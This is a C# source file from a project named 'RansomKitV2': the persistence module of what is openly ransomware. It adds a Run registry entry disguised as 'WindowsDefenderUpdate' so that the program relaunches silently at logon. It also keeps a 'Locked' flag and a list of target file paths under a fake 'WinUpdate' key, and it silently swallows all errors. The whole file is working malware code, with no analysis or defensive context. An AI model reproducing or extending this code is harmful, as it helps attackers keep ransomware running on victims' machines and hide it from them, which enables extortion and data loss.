using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace RansomKitV2
{
    internal static class Persistence
    {
        private const string StateKeyPath = @"Software\Microsoft\Windows\CurrentVersion\WinUpdate";
        private const string RunKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RunValueName = "WindowsDefenderUpdate";
        private const string LockedValue = "Locked";
        private const string PathsValue = "Paths";

        public static void EnsureAutoStart()
        {
            try
            {
                using var key = Registry.CurrentUser.CreateSubKey(RunKeyPath, true);
                if (key == null) return;
                string exe = Process.GetCurrentProcess().MainModule?.FileName
                             ?? Application.ExecutablePath;
                key.SetValue(RunValueName, $"\"{exe}\" --silent", RegistryValueKind.String);
            }
            catch { }
        }

        public static void DisableAutoStart()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(RunKeyPath, true);
                key?.DeleteValue(RunValueName, false);
            }
            catch { }
        }

        // Kept for compat with existing MainForm calls.
        public static void Enable() => EnsureAutoStart();

        public static bool IsLocked()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(StateKeyPath, false);
                var v = key?.GetValue(LockedValue);
                return v is int i && i == 1;
            }
            catch { return false; }
        }

        public static void SetLocked(bool locked)
        {
            try
            {
                using var key = Registry.CurrentUser.CreateSubKey(StateKeyPath, true);
                key?.SetValue(LockedValue, locked ? 1 : 0, RegistryValueKind.DWord);
            }
            catch { }
        }

        public static void SavePaths(IEnumerable<string> paths)
        {
            try
            {
                using var key = Registry.CurrentUser.CreateSubKey(StateKeyPath, true);
                key?.SetValue(PathsValue, string.Join('|', paths), RegistryValueKind.String);
            }
            catch { }
        }

        public static List<string> LoadPaths()
        {
            var list = new List<string>();
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(StateKeyPath, false);
                var raw = key?.GetValue(PathsValue) as string;
                if (string.IsNullOrEmpty(raw)) return list;
                foreach (var p in raw.Split('|', StringSplitOptions.RemoveEmptyEntries))
                    if (Directory.Exists(p) || File.Exists(p)) list.Add(p);
            }
            catch { }
            return list;
        }

        public static void ClearPaths()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(StateKeyPath, true);
                key?.DeleteValue(PathsValue, false);
            }
            catch { }
        }
    }
}